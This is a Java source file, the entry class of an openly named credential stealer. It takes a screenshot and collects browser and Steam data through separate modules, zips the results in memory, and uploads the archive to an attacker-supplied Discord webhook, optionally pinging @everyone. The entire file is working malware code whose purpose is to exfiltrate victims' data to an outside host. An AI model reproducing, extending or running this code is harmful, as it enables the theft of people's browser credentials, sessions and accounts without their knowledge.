package com.github.shurpe.stealer;

import com.github.shurpe.stealer.module.ScreenshotModule;
import com.github.shurpe.stealer.module.BrowsersModule;
import com.github.shurpe.stealer.module.SteamModule;
import com.github.shurpe.stealer.utils.DiscordWebhook;

import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.time.Instant;
import java.util.zip.ZipOutputStream;

public final class Stealer {

	public static void run(String webhookUrl, boolean ping) {
		final DiscordWebhook webhook = new DiscordWebhook(webhookUrl)
				  .setUsername("github.com/14ms/java-stealer");

		if (ping) {
			webhook.setContent("@everyone");
		}

		final ByteArrayOutputStream byteOS = new ByteArrayOutputStream();
		final ZipOutputStream zipOS = new ZipOutputStream(byteOS);

		try {
			ScreenshotModule.INSTANCE.toOutput(zipOS);
			BrowsersModule.INSTANCE.toOutput(zipOS);
			SteamModule.INSTANCE.toOutput(zipOS);

			zipOS.close();
			byteOS.close();

			webhook.addFile(new DiscordWebhook.FileObject("data-" + Instant.now().toString() + ".zip",
					  byteOS.toByteArray()));
			webhook.execute();
		} catch (IOException e) {
			e.printStackTrace();
		}
	}
}